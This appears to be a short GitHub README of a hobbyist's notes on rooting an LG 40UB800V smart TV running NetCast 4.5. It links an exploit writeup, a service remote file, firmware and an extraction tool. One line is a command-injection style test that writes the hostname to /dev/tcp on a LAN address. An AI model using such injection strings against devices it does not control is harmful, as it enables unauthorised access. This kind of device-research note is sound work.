# lg-40ub800v
Exploring NetCast4.5 on lg 40ub800v

Exploit of a similar model:

https://www.encrypted.at/remote-root-shell-on-lg-tv-2013-netcast-models/

Service Remote IR File:

https://github.com/logickworkshop/Flipper-IRDB/blob/main/TVs/LG/LG_MKJ39170828_Service.ir

Charriot Endpoint is startable

Exploit from article above does not work

Thought about something like this:



Serial adapter(?):

you can connect a PL2303-based USB/serial adapter
although it may require specific VID/PID (aten UC232)

Testing TCP Connections?

Maybe this works?

```
"Hi from LGTV at $(uname -n)" 2>/dev/null > /dev/tcp/192.168.178.123/8989"
```

TIL it won't, thats a bash feature

LG Opensource about a similar model with NetCast4.5

https://opensource.lge.com/product/list?page=&keyword=netcast4.5&schType=

(Click on the Notice Icon)

Downloaded firmware from LG Page https://gscs-b2c.lge.com/downloadFile?fileId=TChspcUESxIee32k8JuGQ

binwalk can't find anything, seems to be encrypted

but hey, there is https://github.com/openlgtv/epk2extract - maybe this is worth a try :)

Another idea is to switch names to the pelinux....tar, there are different versions of the chariot endpoint software.

![image](https://github.com/user-attachments/assets/4e9e7d7b-91e5-4670-807c-7ef0cff9f136)

